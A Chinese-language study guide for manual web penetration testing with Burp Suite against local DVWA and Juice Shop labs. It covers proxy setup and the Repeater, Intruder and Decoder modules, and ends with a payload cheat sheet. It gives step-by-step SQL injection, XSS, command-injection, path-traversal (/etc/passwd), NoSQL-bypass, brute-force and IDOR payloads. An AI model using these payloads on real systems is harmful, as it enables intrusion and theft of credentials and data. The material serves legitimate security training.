# Phase 3 学习指南: Burp Suite 手动测试

## 学习目标

通过 Burp Suite Community Edition 学习手动渗透测试，掌握：
- Burp Suite 核心模块使用
- HTTP 请求拦截与修改
- 手动渗透测试技巧
- 与 ZAP 自动化扫描的互补使用

---

## 1. 环境配置

### 安装 Burp Suite CE

```bash
# macOS 安装
brew install --cask burp-suite

# 或从官网下载
# https://portswigger.net/burp/communitydownload

# 启动 Burp Suite
open -a "Burp Suite Community Edition"
```

### 启动测试目标

```bash
# 进入项目目录
cd /Users/michaelzhou/Documents/github/michael-zhou-qa-portfolio/security-testing-demo

# 启动 Docker 环境
docker compose -f docker/docker-compose.yml up -d

# 验证目标
curl -I http://localhost        # DVWA
curl -I http://localhost:3000   # Juice Shop
```

### 浏览器代理配置

#### Firefox (推荐)

1. 打开 Firefox 设置
2. 搜索 "proxy" 或 "代理"
3. 选择 "Manual proxy configuration"
4. HTTP Proxy: `127.0.0.1`，Port: `8080`
5. 勾选 "Also use this proxy for HTTPS"

#### Chrome

1. 安装 SwitchyOmega 扩展
2. 创建代理配置文件: `127.0.0.1:8080`
3. 切换到该配置文件

#### macOS 系统代理

```bash
# 设置代理
networksetup -setwebproxy "Wi-Fi" 127.0.0.1 8080
networksetup -setsecurewebproxy "Wi-Fi" 127.0.0.1 8080

# 测试完成后关闭代理
networksetup -setwebproxystate "Wi-Fi" off
networksetup -setsecurewebproxystate "Wi-Fi" off
```

### CA 证书安装

1. 配置代理后访问 http://burp
2. 点击 "CA Certificate" 下载证书
3. 导入证书到浏览器或系统信任存储

#### Firefox 导入

1. 设置 > 隐私与安全 > 证书
2. 查看证书 > 导入
3. 选择下载的 `cacert.der`
4. 勾选 "信任此 CA 以识别网站"

#### macOS 系统导入

```bash
# 添加到系统钥匙串
sudo security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain cacert.der
```

---

## 2. Burp Suite 界面概览

### 主要模块

| 模块 | 功能 | 用途 |
|------|------|------|
| Proxy | 代理拦截 | 拦截和修改请求 |
| Target | 目标管理 | 站点地图和范围 |
| Repeater | 请求重放 | 手动修改和重发请求 |
| Intruder | 自动化攻击 | 暴力破解、模糊测试 |
| Decoder | 编解码 | URL/Base64/HTML 编码 |
| Comparer | 比较工具 | 比较请求/响应差异 |

### 工作流程

```
Browser ──> Proxy (拦截) ──> Target (记录)
                │
                ├──> Repeater (重放测试)
                │
                ├──> Intruder (批量测试)
                │
                └──> Decoder (编解码)
```

---

## 3. Proxy 模块

### 拦截请求

1. 确保 **Proxy > Intercept > Intercept is on**
2. 浏览器访问目标网站
3. Burp 会拦截请求
4. 查看/修改请求内容
5. 点击 **Forward** 继续或 **Drop** 丢弃

### 手动验证练习

#### 练习 1: DVWA 登录拦截

1. 开启 Intercept
2. 访问 http://localhost/login.php
3. 输入: `admin` / `password`
4. 点击 Login

观察拦截的请求:

```http
POST /login.php HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded

username=admin&password=password&Login=Login&user_token=xxx
```

**关键观察点:**
- 请求方法: POST
- Content-Type: application/x-www-form-urlencoded
- 参数: username, password, user_token
- Cookie: PHPSESSID

#### 练习 2: Juice Shop 登录拦截

1. 访问 http://localhost:3000
2. 点击 Login
3. 输入任意凭据并提交

观察拦截的请求:

```http
POST /rest/user/login HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{"email":"test@test.com","password":"test123"}
```

**对比观察:**
- Juice Shop 使用 JSON 格式
- API 路径: /rest/user/login
- 无 CSRF Token (RESTful API)

### HTTP History

- **Proxy > HTTP history** 显示所有流量
- 可以按 URL、状态码、MIME 类型过滤
- 右键请求可以发送到其他模块

### 快捷键

| 快捷键 | 功能 |
|--------|------|
| Ctrl+F | Forward (转发请求) |
| Ctrl+D | Drop (丢弃请求) |
| Ctrl+T | Toggle Intercept |
| Ctrl+R | Send to Repeater |
| Ctrl+I | Send to Intruder |

---

## 4. Repeater 模块

### 基本使用

1. 在 Proxy 或 Target 中右键请求
2. 选择 **Send to Repeater** (Ctrl+R)
3. 切换到 **Repeater** 标签
4. 修改请求参数
5. 点击 **Send** 发送
6. 查看响应

### 手动验证练习

#### 练习 1: SQL 注入测试

1. 访问 DVWA SQL Injection 页面
2. 拦截包含 `id` 参数的请求
3. 发送到 Repeater

测试 Payload:

```http
GET /vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1

# 修改为:
GET /vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit HTTP/1.1
```

**响应分析:**
- 查看响应中是否返回多条记录
- 查看是否有 SQL 错误信息

#### 练习 2: Union 注入提取数据

```http
# 确定列数
GET /vulnerabilities/sqli/?id=1'+UNION+SELECT+NULL,NULL--&Submit=Submit

# 提取数据库信息
GET /vulnerabilities/sqli/?id=1'+UNION+SELECT+user(),database()--&Submit=Submit

# 提取用户表
GET /vulnerabilities/sqli/?id=1'+UNION+SELECT+user,password+FROM+users--&Submit=Submit
```

#### 练习 3: XSS 测试

```http
# 原始请求
GET /vulnerabilities/xss_r/?name=test HTTP/1.1

# 修改为 XSS Payload
GET /vulnerabilities/xss_r/?name=<script>alert('XSS')</script> HTTP/1.1
```

**响应分析:**
- 检查 Payload 是否在响应中原样返回
- 检查是否被 HTML 编码

#### 练习 4: Juice Shop IDOR 测试

```http
# 登录后获取 Token
POST /rest/user/login HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{"email":"test@test.com","password":"Test123!"}

# 使用 Token 访问他人购物车 (修改 basket ID)
GET /rest/basket/1 HTTP/1.1
Authorization: Bearer <YOUR_TOKEN>
```

---

## 5. Intruder 模块

### 攻击类型

| 类型 | 描述 | 用途 |
|------|------|------|
| Sniper | 单参数单 Payload | 基础测试 |
| Battering ram | 多位置同 Payload | 密码填充 |
| Pitchfork | 多参数多 Payload (同步) | 用户名/密码对 |
| Cluster bomb | 多参数多 Payload (组合) | 全组合测试 |

### 手动验证练习

#### 练习 1: 暴力破解 DVWA 登录

1. 拦截 DVWA 登录请求
2. 发送到 Intruder (Ctrl+I)
3. **Positions** 标签:
   - 点击 **Clear** 清除所有标记
   - 选中密码值，点击 **Add**

```http
POST /vulnerabilities/brute/ HTTP/1.1

username=admin&password=§test§&Login=Login
```

4. **Payloads** 标签:
   - Payload type: Simple list
   - 添加密码列表:
     - password
     - admin
     - 123456
     - password123
     - admin123

5. 点击 **Start attack**

**结果分析:**
- 查看响应长度差异
- 正确密码的响应通常与错误密码不同
- CE 版本有速率限制

#### 练习 2: 参数模糊测试

1. 选择包含参数的请求
2. 标记要测试的参数位置
3. 使用 Fuzzing Payload 列表:

```
'
"
<script>
../
${7*7}
{{7*7}}
;ls
| ls
& ls
```

#### 练习 3: IDOR 测试

```http
GET /rest/basket/§1§ HTTP/1.1
Authorization: Bearer <TOKEN>
```

Payload:
- 数字序列: 1, 2, 3, 4, 5...
- 使用 Numbers payload type

---

## 6. Decoder 模块

### 支持的编码

| 编码类型 | 示例 |
|----------|------|
| URL | `%3Cscript%3E` |
| Base64 | `PHNjcmlwdD4=` |
| HTML | `&lt;script&gt;` |
| Hex | `3c736372697074` |
| ASCII Hex | `\x3c\x73\x63\x72\x69\x70\x74` |

### 手动验证练习

#### 练习 1: URL 编码/解码

```
# 输入
<script>alert(1)</script>

# URL 编码
%3Cscript%3Ealert%281%29%3C%2Fscript%3E

# 双重 URL 编码 (绕过过滤器)
%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E
```

#### 练习 2: Base64 编码

```
# 输入
admin:password

# Base64 编码
YWRtaW46cGFzc3dvcmQ=

# 用于 Basic Auth
Authorization: Basic YWRtaW46cGFzc3dvcmQ=
```

#### 练习 3: JWT 解码

```
# JWT Token
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7ImlkIjoxfX0.xxx

# 分解:
# Header: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
# Payload: eyJkYXRhIjp7ImlkIjoxfX0
# Signature: xxx

# Base64 解码 Header:
{"alg":"HS256","typ":"JWT"}

# Base64 解码 Payload:
{"data":{"id":1}}
```

### 编码绕过技巧

```
# 原始 Payload
<script>alert(1)</script>

# URL 编码
%3Cscript%3Ealert(1)%3C/script%3E

# 混合大小写 + URL 编码
%3CScRiPt%3Ealert(1)%3C/ScRiPt%3E

# Unicode 编码
\u003cscript\u003ealert(1)\u003c/script\u003e

# HTML 实体编码
&#60;script&#62;alert(1)&#60;/script&#62;
```

---

## 7. 综合练习场景

### 场景 1: DVWA XSS 完整测试

```
1. 设置 DVWA 安全级别为 Low

2. 访问 XSS (Reflected) 页面
   URL: http://localhost/vulnerabilities/xss_r/

3. 正常请求 → 发送到 Repeater
   GET /vulnerabilities/xss_r/?name=test

4. 测试基础 Payload
   ?name=<script>alert('XSS')</script>

5. 检查响应
   - 搜索 "<script>" 是否存在
   - 确认未被编码

6. 提高安全级别为 Medium
   访问 security.php 修改

7. 重新测试 → 被过滤

8. 尝试绕过
   ?name=<SCRIPT>alert('XSS')</SCRIPT>
   ?name=<img src=x onerror=alert('XSS')>
```

### 场景 2: DVWA SQL 注入完整测试

```
1. 访问 SQL Injection 页面
   URL: http://localhost/vulnerabilities/sqli/

2. 拦截并发送到 Repeater
   GET /vulnerabilities/sqli/?id=1&Submit=Submit

3. 测试错误型注入
   ?id=1'

4. 确定列数 (Union 注入)
   ?id=1' UNION SELECT NULL-- (错误)
   ?id=1' UNION SELECT NULL,NULL-- (成功)

5. 提取信息
   ?id=1' UNION SELECT user(),database()--

6. 获取表名
   ?id=1' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--

7. 获取用户数据
   ?id=1' UNION SELECT user,password FROM users--
```

### 场景 3: Juice Shop API 测试

```
1. 注册账户
   POST /api/Users/
   {"email":"test@test.com","password":"Test123!","passwordRepeat":"Test123!","securityQuestion":{"id":1},"securityAnswer":"test"}

2. 登录获取 Token
   POST /rest/user/login
   {"email":"test@test.com","password":"Test123!"}

   记录返回的 token

3. 测试 IDOR
   GET /rest/basket/1
   Authorization: Bearer <token>

4. 测试 NoSQL 注入
   POST /rest/user/login
   {"email":{"$ne":""},"password":{"$ne":""}}

5. 测试 JWT 篡改
   - 解码 Token
   - 修改 user id
   - 发送修改后的 Token
```

---

## 8. ZAP vs Burp Suite 对比

### 功能对比

| 功能 | ZAP | Burp Suite CE |
|------|-----|---------------|
| 自动扫描 | 强大 | 基础 |
| 手动测试 | 基础 | 强大 |
| API 接口 | 完善 | 无 (Pro 版有) |
| 价格 | 免费 | 免费/付费 |
| CI/CD 集成 | 优秀 | 困难 |
| Intruder 速率 | 无限制 | 有限制 |
| 扩展性 | 插件 | 扩展 |

### 适用场景

| 场景 | 推荐工具 |
|------|----------|
| CI/CD 自动化扫描 | ZAP |
| 手动渗透测试 | Burp Suite |
| API 自动化测试 | ZAP |
| 复杂业务逻辑测试 | Burp Suite |
| 快速漏洞验证 | Burp Suite |
| 大规模扫描 | ZAP |

### 互补使用策略

```
1. 使用 ZAP 进行基线扫描
   → 发现潜在问题点

2. 使用 Burp Suite 手动验证
   → 确认漏洞可利用性

3. 使用 ZAP 生成自动化报告
   → CI/CD 集成和跟踪

4. 使用 Burp Suite 编写 PoC
   → 复现步骤和修复验证
```

---

## 9. 学习检查清单

### 知识掌握

- [ ] 理解 Burp Suite 各模块的功能
- [ ] 理解 HTTP 请求/响应结构
- [ ] 理解代理拦截工作原理
- [ ] 理解各种编码方式
- [ ] 理解 ZAP 和 Burp Suite 的互补关系

### 实操技能

- [ ] 能配置浏览器代理
- [ ] 能使用 Proxy 拦截和修改请求
- [ ] 能使用 Repeater 进行手动测试
- [ ] 能使用 Intruder 进行暴力破解
- [ ] 能使用 Decoder 进行编解码
- [ ] 能完成 DVWA 的基础挑战

### 工具熟练度

- [ ] 熟悉 Burp Suite 快捷键
- [ ] 能高效地在模块间切换
- [ ] 能分析 HTTP 响应
- [ ] 能识别常见漏洞特征

---

## 10. 常见问题

### Q: 浏览器无法连接怎么办？

```bash
# 1. 确认 Burp Suite 正在运行
# 2. 确认 Proxy listener 正常
#    Proxy > Options > Proxy Listeners > Running

# 3. 确认浏览器代理设置正确
#    127.0.0.1:8080

# 4. 检查是否有其他程序占用 8080 端口
lsof -i :8080

# 5. 修改 Burp 监听端口
#    Proxy > Options > Add > 其他端口
```

### Q: HTTPS 网站显示证书错误？

1. 确认已下载并安装 Burp CA 证书
2. 访问 http://burp 下载证书
3. 正确导入到浏览器/系统信任存储
4. 重启浏览器

### Q: Intruder 太慢怎么办？

- CE 版本有速率限制，这是正常的
- 考虑使用 Pro 版本进行大规模测试
- 或使用 ZAP 进行自动化暴力破解

### Q: 如何保存 Burp 项目？

- CE 版本只能创建临时项目
- 下次打开会丢失历史记录
- Pro 版本支持保存项目文件
- 可以使用 "Save items" 导出请求

### Q: 测试完成后如何关闭代理？

```bash
# macOS
networksetup -setwebproxystate "Wi-Fi" off
networksetup -setsecurewebproxystate "Wi-Fi" off

# 或在浏览器中关闭代理设置
# Firefox: Settings > Network > No proxy
# Chrome: 关闭 SwitchyOmega 或切换到直接连接
```

---

## 11. 快速参考卡

### 常用快捷键

| 快捷键 | 功能 |
|--------|------|
| Ctrl+T | 切换拦截 |
| Ctrl+F | 转发请求 |
| Ctrl+D | 丢弃请求 |
| Ctrl+R | 发送到 Repeater |
| Ctrl+I | 发送到 Intruder |
| Ctrl+U | URL 编码选中文本 |
| Ctrl+Shift+U | URL 解码选中文本 |
| Ctrl+B | Base64 编码 |
| Ctrl+Shift+B | Base64 解码 |

### 测试 Payload 速查

```
# SQL 注入
' OR '1'='1
' OR '1'='1'--
1 UNION SELECT NULL,NULL--
'; DROP TABLE users;--

# XSS
<script>alert(1)</script>
<img src=x onerror=alert(1)>
"><script>alert(1)</script>
javascript:alert(1)

# 命令注入
; ls
| cat /etc/passwd
& whoami
`id`

# 路径遍历
../../../etc/passwd
..%2f..%2f..%2fetc/passwd
....//....//....//etc/passwd

# NoSQL
{"$ne":""}
{"$gt":""}
{"$regex":".*"}
```

### 启动命令

```bash
# 启动测试环境
docker compose -f docker/docker-compose.yml up -d

# 验证目标
curl -I http://localhost        # DVWA
curl -I http://localhost:3000   # Juice Shop

# 启动 Burp Suite
open -a "Burp Suite Community Edition"

# 测试完成后关闭代理
networksetup -setwebproxystate "Wi-Fi" off
networksetup -setsecurewebproxystate "Wi-Fi" off

# 停止环境
docker compose -f docker/docker-compose.yml down
```
